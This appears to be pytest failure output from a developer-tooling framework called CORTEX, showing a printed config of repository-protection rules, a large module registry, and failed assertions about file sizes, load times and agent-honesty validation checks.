\u2022 Combined progress: 20/33 modules (61%)\n   \u2022 Conflicts resolved: 1\n   \u2022 Archived split docs\n   \u2022 Reset to single-track mode\n```\n'}]}, {'layer_id': 'knowledge_quality', 'name': 'Knowledge Quality', 'description': 'Pattern validation and confidence thresholds', 'priority': 6, 'rules': [{'rule_id': 'MIN_OCCURRENCES', 'name': 'Minimum Occurrences for High Confidence', 'severity': 'warning', 'description': 'High confidence (>0.50) with single occurrence', 'detection': {'combined_keywords': {'high_confidence': ['confidence: 1.0', 'confidence=1.0', 'confidence: 0.95'], 'single_event': ['first occurrence', 'single event', 'occurrences: 1']}, 'scope': ['description'], 'logic': 'AND'}, 'alternatives': ['Start with confidence \u22640.50 for single event', 'Wait for 3+ occurrences before high confidence', 'Mark as provisional pattern'], 'evidence': 'Require 3+ occurrences for confidence >0.50'}, {'rule_id': 'PATTERN_VALIDATION', 'name': 'Pattern Validation', 'severity': 'warning', 'description': 'Pattern lacks validation evidence', 'detection': {'keywords': ['add pattern without validation', 'no evidence', 'unverified pattern'], 'scope': ['description']}, 'alternatives': ['Add validation test', 'Link to source documentation', 'Mark as hypothesis for validation'], 'evidence': 'Patterns require empirical validation'}]}, {'layer_id': 'commit_integrity', 'name': 'Commit Integrity', 'description': 'Brain state files excluded from commits', 'priority': 7, 'rules': [{'rule_id': 'BRAIN_STATE_GITIGNORE', 'name': 'Brain State Files Not Committed', 'severity': 'warning', 'description': 'Brain state file should not be committed', 'detection': {'files': '{{brain_state_files}}', 'keywords': ['commit'], 'scope': ['intent']}, 'alternatives': ['Add to .gitignore', 'Keep local-only', 'Export as snapshot if needed for sharing'], 'evidence': 'Add to .gitignore to prevent pollution'}, {'rule_id': 'TEMP_FILES_COMMIT', 'name': 'Temporary Files Not Committed', 'severity': 'warning', 'description': 'Temporary or generated files should not be committed', 'detection': {'path_patterns': ['**/*.tmp', '**/temp_*', '**/__pycache__/**', '**/node_modules/**'], 'keywords': ['commit'], 'scope': ['intent']}, 'alternatives': ['Update .gitignore', 'Clean before commit', 'Use .gitkeep for empty directories'], 'evidence': 'Temporary files pollute repository'}]}, {'layer_id': 'git_isolation', 'name': 'Git Isolation Enforcement', 'description': 'CORTEX code MUST NEVER be committed to user application repositories', 'priority': 8, 'rules': [{'rule_id': 'GIT_ISOLATION_ENFORCEMENT', 'name': 'CORTEX Code Isolation from User Repos', 'severity': 'blocked', 'description': 'CRITICAL: CORTEX source code, brain files, or internal components being committed to user application repository', 'detection': {'path_patterns': ['**/src/tier0/**', '**/src/tier1/**', '**/src/tier2/**', '**/src/tier3/**', '**/src/cortex_agents/**', '**/src/plugins/**', '**/src/crawlers/**', '**/cortex-brain/**', '**/prompts/**', '**/scripts/cortex/**', '**/CORTEX/**'], 'in_repo': 'user_application'}, 'alternatives': ['Keep CORTEX as separate repository/package', 'Install CORTEX via pip/npm (when distributed)', 'Use git submodule if local development required', 'Ensure .gitignore excludes CORTEX directories'], 'evidence_template': "\U0001f6a8 CRITICAL VIOLATION: Git Isolation Breach\n\nCORTEX code detected in user application repository!\nFile: '{path}'\n\nCORTEX MUST remain isolated from user application code:\n- User App Repo: Application-specific code only\n- CORTEX Repo: Framework code (separate repository)\n- Knowledge Sharing: Via exported YAML (team-knowledge/)\n\nBrain knowledge (cortex-brain/) is LOCAL ONLY - never committed anywhere.\n", 'rationale': 'GIT_ISOLATION_ENFORCEMENT: Core CORTEX Principle\n\nCORTEX operates as a SEPARATE cognitive layer:\n\n\u274c NEVER DO THIS:\nUserApp/\n\u251c\u2500\u2500 src/                    # User\'s application code\n\u251c\u2500\u2500 cortex-brain/           # \u274c WRONG - Don\'t commit brain!\n\u251c\u2500\u2500 src/tier0/              # \u274c WRONG - Don\'t copy CORTEX code!\n\u251c\u2500\u2500 src/cortex_agents/      # \u274c WRONG - Keep CORTEX separate!\n\u2514\u2500\u2500 .git/\n\n\u2705 CORRECT SETUP:\nUserApp/\n\u251c\u2500\u2500 src/                    # User\'s application code\n\u251c\u2500\u2500 team-knowledge/         # \u2705 OK - Exported YAML patterns\n\u251c\u2500\u2500 .gitignore              # \u2705 Must include: cortex-brain/\n\u2514\u2500\u2500 .git/\n\nCORTEX/ (separate repo)\n\u251c\u2500\u2500 src/tier0/              # \u2705 CORTEX framework code\n\u251c\u2500\u2500 src/cortex_agents/      # \u2705 Agent system\n\u251c\u2500\u2500 cortex-brain/           # \u2705 Local brain (not in git)\n\u2514\u2500\u2500 .git/\n\nWhy This Matters:\n1. Separation of Concerns: Framework vs. Application\n2. Licensing: CORTEX proprietary, user code their own license\n3. Updates: CORTEX updates don\'t pollute user repos\n4. Security: Brain knowledge stays local, never exposed\n5. Clarity: Clear boundary between "your code" and "framework"\n\nGit Hooks (setup during init):\n- pre-commit: Scans for CORTEX paths, blocks commit if found\n- pre-push: Double-check no CORTEX code being pushed\n\nException: team-knowledge/ YAML exports allowed (knowledge sharing)\n'}, {'rule_id': 'GIT_HOOKS_INSTALLATION', 'name': 'Git Hooks Must Be Installed During Setup', 'severity': 'blocked', 'description': 'Setup process must install git hooks to prevent accidental CORTEX code commits', 'detection': {'keywords': ['skip git hooks', 'disable hooks', 'bypass hook installation'], 'scope': ['intent', 'description']}, 'alternatives': ["Run 'cortex init' to install hooks automatically", 'Manually run setup script with hooks enabled', 'Never bypass hook installation (critical protection)'], 'evidence_template': 'Git hooks are MANDATORY for CORTEX isolation protection', 'rationale': "Git hooks provide automatic enforcement:\n\npre-commit hook:\n- Scans staged files for CORTEX paths\n- Blocks commit if any CORTEX code detected\n- Shows clear error message with alternatives\n\npre-push hook:\n- Final safety check before push\n- Prevents accidental exposure of CORTEX code\n\nInstallation: Automatic during 'cortex init'\nLocation: UserApp/.git/hooks/ (user's repo, not CORTEX repo)\n"}]}], 'severity_levels': {'safe': {'decision': 'ALLOW', 'override_required': False, 'message': '\u2705 Modification appears safe. No violations detected.'}, 'warning': {'decision': 'WARN', 'override_required': False, 'message': '\u26a0\ufe0f WARNING: Risky patterns detected. Proceed with caution.'}, 'blocked': {'decision': 'BLOCK', 'override_required': True, 'message': '\U0001f6e1\ufe0f BLOCKED: Critical architectural violations detected.'}}, 'challenge_template': "\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\U0001f9e0 BRAIN PROTECTION CHALLENGE\n\nTimestamp: {timestamp}\nSeverity: {severity}\nDecision: {decision}\n\n{message}\n\nSAFE ALTERNATIVES:\n{alternatives}\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nOptions:\n  1. Accept recommended alternative (SAFE)\n  2. Provide different approach (REVIEW)\n  3. Type 'OVERRIDE' with justification (RISKY)\n\nYour choice:\n", 'logging': {'enabled': True, 'path': 'cortex-brain/corpus-callosum/protection-events.jsonl', 'format': 'jsonl', 'include_fields': ['timestamp', 'event', 'request', 'violations', 'decision', 'severity', 'alternatives_suggested', 'user_decision', 'override_justification', 'override_required']}, 'validation': [{'check': 'rules_complete', 'scope': 'protection_layers', 'required': True, 'params': {'all_layers_have_rules': True, 'all_rules_have_detection': True, 'all_rules_have_alternatives': True}}, {'check': 'severity_valid', 'scope': 'rules', 'required': True, 'params': {'valid_severities': ['safe', 'warning', 'blocked']}}, {'check': 'templates_valid', 'scope': 'challenge_template', 'required': True, 'params': {'has_placeholders': True, 'has_options': True}}]}
FAILED tests/test_yaml_loading.py::TestYAMLLoading::test_brain_protection_rules_content - KeyError: 'rules'
FAILED tests/test_yaml_loading.py::TestYAMLLoading::test_design_metadata_phases - AssertionError: Phase phase_6 missing 'completion_percentage'
assert 'completion_percentage' in {'id': 6, 'name': 'VS Code Extension', 'status': 'planned', 'weeks': '17-20', 'estimated_hours': 40}
FAILED tests/test_yaml_loading.py::TestYAMLLoading::test_yaml_loading_performance - AssertionError: cortex-operations.yaml took 0.125s to load (limit: 0.1s)
assert 0.12505817413330078 < 0.1
FAILED tests/test_yaml_loading.py::TestYAMLLoading::test_all_yaml_files_consistent - AssertionError: Operation refresh_cortex_story references unknown module: load_story_template
assert 'load_story_template' in {'demo_introduction': {'name': 'Demo Introduction', 'category': 'demo', 'phase': 'preparation', 'priority': 1, 'description': 'Welcome message and demo flow explanation', 'file_path': 'src/operations/modules/demo_introduction_module.py', 'class_name': 'DemoIntroductionModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.0, 'actual_hours': 0.8, 'test_coverage': 95, 'notes': 'Windows Track A - First module implemented'}, 'demo_help_system': {'name': 'Demo Help System', 'category': 'demo', 'phase': 'preparation', 'priority': 2, 'description': 'Demonstrate help command capabilities', 'file_path': 'src/operations/modules/demo_help_system_module.py', 'class_name': 'DemoHelpSystemModule', 'dependencies': ['demo_introduction'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.2, 'test_coverage': 90, 'notes': 'Windows Track A - Uses response templates'}, 'demo_story_refresh': {'name': 'Demo Story Refresh', 'category': 'demo', 'phase': 'execution', 'priority': 3, 'description': 'Show story transformation in action', 'file_path': 'src/operations/modules/demo_story_refresh_module.py', 'class_name': 'DemoStoryRefreshModule', 'dependencies': ['demo_introduction', 'demo_help_system'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.0, 'actual_hours': 1.8, 'test_coverage': 92, 'notes': 'Mac Track B - Narrator voice integration'}, 'demo_cleanup': {'name': 'Demo Cleanup', 'category': 'demo', 'phase': 'execution', 'priority': 4, 'description': 'Demonstrate cleanup operation', 'file_path': 'src/operations/modules/demo_cleanup_module.py', 'class_name': 'DemoCleanupModule', 'dependencies': ['demo_introduction', 'demo_help_system'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.3, 'test_coverage': 88, 'notes': 'Windows Track A - Shows maintenance capabilities'}, 'demo_conversation': {'name': 'Demo Conversation', 'category': 'demo', 'phase': 'execution', 'priority': 5, 'description': 'Demonstrate conversation memory', 'file_path': 'src/operations/modules/demo_conversation_module.py', 'class_name': 'DemoConversationModule', 'dependencies': ['demo_introduction'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.0, 'actual_hours': 2.1, 'test_coverage': 85, 'notes': 'Mac Track B - Shows Tier 1 memory'}, 'demo_completion': {'name': 'Demo Completion', 'category': 'demo', 'phase': 'completion', 'priority': 6, 'description': 'Summary and next steps', 'file_path': 'src/operations/modules/demo_completion_module.py', 'class_name': 'DemoCompletionModule', 'dependencies': ['demo_introduction'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 1.0, 'actual_hours': 0.9, 'test_coverage': 93, 'notes': 'Mac Track B - Final demo module'}, 'project_validation': {'name': 'Project Validation', 'category': 'setup', 'phase': 'preparation', 'priority': 1, 'description': 'Validate CORTEX project structure', 'file_path': 'src/operations/modules/project_validation_module.py', 'class_name': 'ProjectValidationModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.0, 'actual_hours': 1.8, 'test_coverage': 94, 'notes': 'Foundation module - validates brain structure'}, 'platform_detection': {'name': 'Platform Detection', 'category': 'setup', 'phase': 'preparation', 'priority': 2, 'description': 'Detect OS and configure platform-specific settings', 'file_path': 'src/operations/modules/platform_detection_module.py', 'class_name': 'PlatformDetectionModule', 'dependencies': ['project_validation'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.5, 'actual_hours': 2.3, 'test_coverage': 96, 'notes': 'Supports Mac, Windows, Linux'}, 'git_sync': {'name': 'Git Repository Synchronization', 'category': 'setup', 'phase': 'environment', 'priority': 15, 'description': 'Sync project with remote git repository', 'file_path': 'src/operations/modules/git_sync_module.py', 'class_name': 'GitSyncModule', 'dependencies': ['platform_detection'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 3.0, 'actual_hours': 2.8, 'test_coverage': 89, 'notes': 'Handles offline scenarios gracefully'}, 'virtual_environment': {'name': 'Virtual Environment Setup', 'category': 'setup', 'phase': 'environment', 'priority': 20, 'description': 'Create and configure Python virtual environment', 'file_path': 'src/operations/modules/virtual_environment_module.py', 'class_name': 'VirtualEnvironmentModule', 'dependencies': ['platform_detection'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.5, 'actual_hours': 2.4, 'test_coverage': 91, 'notes': 'Cross-platform venv handling'}, 'python_dependencies': {'name': 'Python Dependencies Installation', 'category': 'setup', 'phase': 'environment', 'priority': 25, 'description': 'Install required Python packages', 'file_path': 'src/operations/modules/python_dependencies_module.py', 'class_name': 'PythonDependenciesModule', 'dependencies': ['virtual_environment'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.0, 'actual_hours': 2.2, 'test_coverage': 87, 'notes': 'Handles requirements.txt and extras'}, 'vision_api': {'name': 'Vision API Configuration', 'category': 'setup', 'phase': 'environment', 'priority': 30, 'description': 'Configure Google Cloud Vision API', 'file_path': 'src/operations/modules/vision_api_module.py', 'class_name': 'VisionAPIModule', 'dependencies': ['python_dependencies'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 3.5, 'actual_hours': 3.8, 'test_coverage': 83, 'notes': 'Optional feature - handles missing credentials'}, 'conversation_tracking': {'name': 'Conversation Tracking Setup', 'category': 'setup', 'phase': 'environment', 'priority': 35, 'description': 'Configure conversation capture daemon', 'file_path': 'src/operations/modules/conversation_tracking_module.py', 'class_name': 'ConversationTrackingModule', 'dependencies': ['python_dependencies'], 'optional': True, 'status': 'pending', 'estimated_hours': 3.0, 'notes': 'Tier 1 memory enablement'}, 'brain_initialization': {'name': 'Brain Initialization', 'category': 'setup', 'phase': 'validation', 'priority': 40, 'description': 'Initialize CORTEX brain tiers', 'file_path': 'src/operations/modules/brain_initialization_module.py', 'class_name': 'BrainInitializationModule', 'dependencies': ['python_dependencies'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 4.0, 'actual_hours': 4.2, 'test_coverage': 92, 'notes': 'Tier 0, 1, 2, 3 setup'}, 'brain_tests': {'name': 'Brain Tests Execution', 'category': 'setup', 'phase': 'verification', 'priority': 45, 'description': 'Run brain integrity tests', 'file_path': 'src/operations/modules/brain_tests_module.py', 'class_name': 'BrainTestsModule', 'dependencies': ['brain_initialization'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 2.0, 'actual_hours': 1.9, 'test_coverage': 90, 'notes': 'Validates all brain tiers'}, 'tooling_verification': {'name': 'Tooling Verification', 'category': 'setup', 'phase': 'verification', 'priority': 50, 'description': 'Verify required tools are available', 'file_path': 'src/operations/modules/tooling_verification_module.py', 'class_name': 'ToolingVerificationModule', 'dependencies': ['platform_detection'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.5, 'notes': 'Check git, python, npm, etc.'}, 'setup_completion': {'name': 'Setup Completion', 'category': 'setup', 'phase': 'completion', 'priority': 100, 'description': 'Finalize setup and provide summary', 'file_path': 'src/operations/modules/setup_completion_module.py', 'class_name': 'SetupCompletionModule', 'dependencies': ['brain_initialization'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-07', 'estimated_hours': 1.0, 'actual_hours': 0.8, 'test_coverage': 95, 'notes': 'Final setup module'}, 'scan_temporary_files': {'name': 'Scan Temporary Files', 'category': 'cleanup', 'phase': 'preparation', 'priority': 1, 'description': 'Identify temporary files for removal', 'file_path': 'src/operations/modules/scan_temporary_files_module.py', 'class_name': 'ScanTemporaryFilesModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.5, 'actual_hours': 2.3, 'test_coverage': 88, 'notes': 'Safe mode with dry-run option'}, 'remove_old_logs': {'name': 'Remove Old Logs', 'category': 'cleanup', 'phase': 'execution', 'priority': 10, 'description': 'Clean up old log files', 'file_path': 'src/operations/modules/remove_old_logs_module.py', 'class_name': 'RemoveOldLogsModule', 'dependencies': ['scan_temporary_files'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.4, 'test_coverage': 85, 'notes': 'Preserves recent logs'}, 'clear_python_cache': {'name': 'Clear Python Cache', 'category': 'cleanup', 'phase': 'execution', 'priority': 15, 'description': 'Remove __pycache__ directories', 'file_path': 'src/operations/modules/clear_python_cache_module.py', 'class_name': 'ClearPythonCacheModule', 'dependencies': [], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.0, 'actual_hours': 0.9, 'test_coverage': 90, 'notes': 'Quick cache cleanup'}, 'vacuum_sqlite_databases': {'name': 'Vacuum SQLite Databases', 'category': 'cleanup', 'phase': 'execution', 'priority': 20, 'description': 'Optimize SQLite database files', 'file_path': 'src/operations/modules/vacuum_sqlite_databases_module.py', 'class_name': 'VacuumSQLiteDatabasesModule', 'dependencies': [], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.0, 'actual_hours': 1.8, 'test_coverage': 87, 'notes': 'Reduces brain database size'}, 'remove_orphaned_files': {'name': 'Remove Orphaned Files', 'category': 'cleanup', 'phase': 'execution', 'priority': 25, 'description': 'Clean up orphaned temporary files', 'file_path': 'src/operations/modules/remove_orphaned_files_module.py', 'class_name': 'RemoveOrphanedFilesModule', 'dependencies': ['scan_temporary_files'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'Safety checks required'}, 'compress_old_files': {'name': 'Compress Old Files', 'category': 'cleanup', 'phase': 'execution', 'priority': 30, 'description': 'Compress large old files', 'file_path': 'src/operations/modules/compress_old_files_module.py', 'class_name': 'CompressOldFilesModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 2.5, 'notes': 'Archive old conversations'}, 'validate_cleanup_safety': {'name': 'Validate Cleanup Safety', 'category': 'cleanup', 'phase': 'verification', 'priority': 50, 'description': "Ensure cleanup didn't break anything", 'file_path': 'src/operations/modules/validate_cleanup_safety_module.py', 'class_name': 'ValidateCleanupSafetyModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'Post-cleanup validation'}, 'generate_cleanup_report': {'name': 'Generate Cleanup Report', 'category': 'cleanup', 'phase': 'completion', 'priority': 100, 'description': 'Create cleanup summary report', 'file_path': 'src/operations/modules/generate_cleanup_report_module.py', 'class_name': 'GenerateCleanupReportModule', 'dependencies': [], 'optional': False, 'status': 'pending', 'estimated_hours': 1.5, 'notes': 'Show space saved and actions taken'}, 'load_story_source': {'name': 'Load Story Source', 'category': 'story', 'phase': 'preparation', 'priority': 1, 'description': 'Load original CORTEX story markdown', 'file_path': 'src/operations/modules/load_story_source_module.py', 'class_name': 'LoadStorySourceModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 1.5, 'actual_hours': 1.3, 'test_coverage': 92, 'notes': 'Validates story structure'}, 'validate_story_structure': {'name': 'Validate Story Structure', 'category': 'story', 'phase': 'validation', 'priority': 5, 'description': 'Ensure story meets structural requirements', 'file_path': 'src/operations/modules/validate_story_structure_module.py', 'class_name': 'ValidateStoryStructureModule', 'dependencies': ['load_story_source'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.0, 'actual_hours': 2.1, 'test_coverage': 89, 'notes': 'Part structure validation'}, 'apply_narrator_voice': {'name': 'Apply Narrator Voice', 'category': 'story', 'phase': 'execution', 'priority': 10, 'description': 'Transform story with narrator voice', 'file_path': 'src/operations/modules/apply_narrator_voice_module.py', 'class_name': 'ApplyNarratorVoiceModule', 'dependencies': ['validate_story_structure'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 4.0, 'actual_hours': 4.3, 'test_coverage': 86, 'notes': 'Core story transformation logic'}, 'story_length_manager': {'name': 'Story Length Manager', 'category': 'story', 'phase': 'execution', 'priority': 15, 'description': 'Manage story length and token optimization', 'file_path': 'src/operations/modules/story_length_manager_module.py', 'class_name': 'StoryLengthManagerModule', 'dependencies': ['apply_narrator_voice'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 3.0, 'actual_hours': 3.2, 'test_coverage': 84, 'notes': 'Part detection and trimming'}, 'build_story_preview': {'name': 'Build Story Preview', 'category': 'story', 'phase': 'execution', 'priority': 20, 'description': 'Generate HTML preview of transformed story', 'file_path': 'src/operations/modules/build_story_preview_module.py', 'class_name': 'BuildStoryPreviewModule', 'dependencies': ['apply_narrator_voice'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 2.5, 'actual_hours': 2.4, 'test_coverage': 81, 'notes': 'Visual story validation'}, 'deploy_docs_preview': {'name': 'Deploy Docs Preview', 'category': 'story', 'phase': 'execution', 'priority': 25, 'description': 'Deploy story preview to docs site', 'file_path': 'src/operations/modules/deploy_docs_preview_module.py', 'class_name': 'DeployDocsPreviewModule', 'dependencies': ['build_story_preview'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'GitHub Pages integration'}, 'update_story_docs': {'name': 'Update Story Documentation', 'category': 'story', 'phase': 'execution', 'priority': 30, 'description': 'Update story in documentation site', 'file_path': 'src/operations/modules/update_story_docs_module.py', 'class_name': 'UpdateStoryDocsModule', 'dependencies': ['apply_narrator_voice'], 'optional': True, 'status': 'pending', 'estimated_hours': 1.5, 'notes': 'MkDocs integration'}, 'story_refresh_completion': {'name': 'Story Refresh Completion', 'category': 'story', 'phase': 'completion', 'priority': 100, 'description': 'Finalize story refresh with summary', 'file_path': 'src/operations/modules/story_refresh_completion_module.py', 'class_name': 'StoryRefreshCompletionModule', 'dependencies': ['apply_narrator_voice'], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-09', 'estimated_hours': 1.0, 'actual_hours': 0.9, 'test_coverage': 93, 'notes': 'Final story refresh module'}, 'scan_docstrings': {'name': 'Scan Docstrings', 'category': 'documentation', 'phase': 'preparation', 'priority': 1, 'description': 'Extract docstrings from source code', 'file_path': 'src/operations/modules/scan_docstrings_module.py', 'class_name': 'ScanDocstringsModule', 'dependencies': [], 'optional': False, 'status': 'pending', 'estimated_hours': 3.0, 'notes': 'Parse Python docstrings'}, 'generate_api_docs': {'name': 'Generate API Documentation', 'category': 'documentation', 'phase': 'execution', 'priority': 10, 'description': 'Generate API reference documentation', 'file_path': 'src/operations/modules/generate_api_docs_module.py', 'class_name': 'GenerateAPIDocsModule', 'dependencies': ['scan_docstrings'], 'optional': False, 'status': 'pending', 'estimated_hours': 4.0, 'notes': 'Sphinx or MkDocs autodoc'}, 'build_mkdocs_site': {'name': 'Build MkDocs Site', 'category': 'documentation', 'phase': 'execution', 'priority': 15, 'description': 'Build complete documentation site', 'file_path': 'src/operations/modules/build_mkdocs_site_module.py', 'class_name': 'BuildMkDocsModule', 'dependencies': [], 'optional': False, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.5, 'actual_hours': 2.3, 'test_coverage': 87, 'notes': 'MkDocs build integration'}, 'update_mkdocs_index': {'name': 'Update MkDocs Index', 'category': 'documentation', 'phase': 'execution', 'priority': 20, 'description': 'Update documentation index', 'file_path': 'src/operations/modules/update_mkdocs_index_module.py', 'class_name': 'UpdateMkDocsIndexModule', 'dependencies': ['build_mkdocs_site'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 1.5, 'actual_hours': 1.4, 'test_coverage': 85, 'notes': 'Navigation structure'}, 'validate_doc_links': {'name': 'Validate Documentation Links', 'category': 'documentation', 'phase': 'verification', 'priority': 30, 'description': 'Check for broken links in docs', 'file_path': 'src/operations/modules/validate_doc_links_module.py', 'class_name': 'ValidateDocLinksModule', 'dependencies': ['build_mkdocs_site'], 'optional': True, 'status': 'ready', 'implementation_date': '2025-11-08', 'estimated_hours': 2.0, 'actual_hours': 1.9, 'test_coverage': 82, 'notes': 'Link checker integration'}, 'refresh_design_docs': {'name': 'Refresh Design Documentation', 'category': 'documentation', 'phase': 'execution', 'priority': 25, 'description': 'Update design documentation files', 'file_path': 'src/operations/modules/refresh_design_docs_module.py', 'class_name': 'RefreshDesignDocsModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 2.5, 'notes': 'CORTEX 2.0 design docs'}, 'generate_diagrams': {'name': 'Generate Diagrams', 'category': 'documentation', 'phase': 'execution', 'priority': 35, 'description': 'Generate architecture diagrams', 'file_path': 'src/operations/modules/generate_diagrams_module.py', 'class_name': 'GenerateDiagramsModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 3.5, 'notes': 'Mermaid or PlantUML'}, 'update_changelog': {'name': 'Update Changelog', 'category': 'documentation', 'phase': 'execution', 'priority': 40, 'description': 'Update CHANGELOG.md', 'file_path': 'src/operations/modules/update_changelog_module.py', 'class_name': 'UpdateChangelogModule', 'dependencies': [], 'optional': True, 'status': 'pending', 'estimated_hours': 1.5, 'notes': 'Conventional commits'}, 'deploy_docs_site': {'name': 'Deploy Documentation Site', 'category': 'documentation', 'phase': 'execution', 'priority': 50, 'description': 'Deploy docs to GitHub Pages', 'file_path': 'src/operations/modules/deploy_docs_site_module.py', 'class_name': 'DeployDocsSiteModule', 'dependencies': ['build_mkdocs_site'], 'optional': True, 'status': 'pending', 'estimated_hours': 2.0, 'notes': 'GitHub Actions integration'}, 'docs_completion': {'name': 'Documentation Completion', 'category': 'documentation', 'phase': 'completion', 'priority': 100, 'description': 'Finalize documentation with summary', 'file_path': 'src/operations/modules/docs_completion_module.py', 'class_name': 'DocsCompletionModule', 'dependencies': [], 'optional': False, 'status': 'pending', 'estimated_hours': 1.0, 'notes': 'Final docs module'}}
FAILED tests/test_yaml_loading.py::TestYAMLTokenOptimization::test_yaml_file_sizes - AssertionError: brain-protection-rules.yaml is 66561 bytes (limit: 10000)
assert 66561 < 10000
FAILED tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_line_count_limit - AssertionError: Entry point has 589 lines (MAX: 500). Consider modularizing large sections.
assert 589 <= 500
FAILED tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_detects_visual_test_patterns[test_playwright_screenshot] - AssertionError: Should recognize: test_playwright_screenshot
assert False
 +  where False = SkullValidation(passed=False, rule_id=<SkullRuleId.VISUAL_REGRESSION: 'SKULL-003'>, rule_name='Visual Regression', message='SKULL-003 VIOLATION: No visual validation for UI update. CSS/UI changes require visual regression test or computed style verification.', enforcement=<EnforcementLevel.WARNING: 'WARNING'>, tests_required=['Visual regression test or computed style check'], tests_found=['test_playwright_screenshot']).passed
FAILED tests/tier0/test_skull_comprehensive.py::TestSkull004RetryWithoutLearning::test_requires_changed_approach - AssertionError: assert not True
 +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_same_test']).passed
FAILED tests/tier0/test_skull_comprehensive.py::TestSkull005TransformationVerification::test_blocks_transformation_claim_without_changes - AssertionError: assert not True
 +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_operation_runs']).passed
FAILED tests/tier0/test_skull_comprehensive.py::TestSkull005TransformationVerification::test_detects_pass_through_operations - AssertionError: assert not True
 +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_runs']).passed
FAILED tests/tier0/test_skull_comprehensive.py::TestRealWorldIncidentPrevention::test_prevents_november_10th_story_refresh_incident - AssertionError: SKULL should detect fake transformation
assert not True
 +  where True = SkullValidation(passed=True, rule_id=None, rule_name='All Rules', message='All SKULL protection checks passed', enforcement=<EnforcementLevel.INFO: 'INFO'>, tests_required=[], tests_found=['test_operation_runs']).passed
FAILED tests/tier0/test_skull_comprehensive.py::TestMultipleViolations::test_css_retry_without_tests_or_diagnosis - AssertionError: assert <EnforcementLevel.WARNING: 'WARNING'> == <EnforcementLevel.BLOCKING: 'BLOCKING'>
 +  where <EnforcementLevel.WARNING: 'WARNING'> = SkullValidation(passed=False, rule_id=<SkullRuleId.RETRY_WITHOUT_LEARNING: 'SKULL-004'>, rule_name='Retry Without Learning', message='SKULL-004 VIOLATION: Retry without diagnosis for Retry CSS fix (attempt 3). Must diagnose WHY previous fix failed before retrying.', enforcement=<EnforcementLevel.WARNING: 'WARNING'>, tests_required=['Root cause diagnosis'], tests_found=[]).enforcement
 +  and   <EnforcementLevel.BLOCKING: 'BLOCKING'> = EnforcementLevel.BLOCKING
FAILED tests/tier0/test_skull_comprehensive.py::TestEnforcementBehavior::test_safe_passes_through - AttributeError: type object 'EnforcementLevel' has no attribute 'SAFE'
FAILED tests/tier0/test_skull_comprehensive.py::TestSkullResponseTemplateIntegration::test_help_command_shows_skull_banner - AssertionError: Should include ASCII art
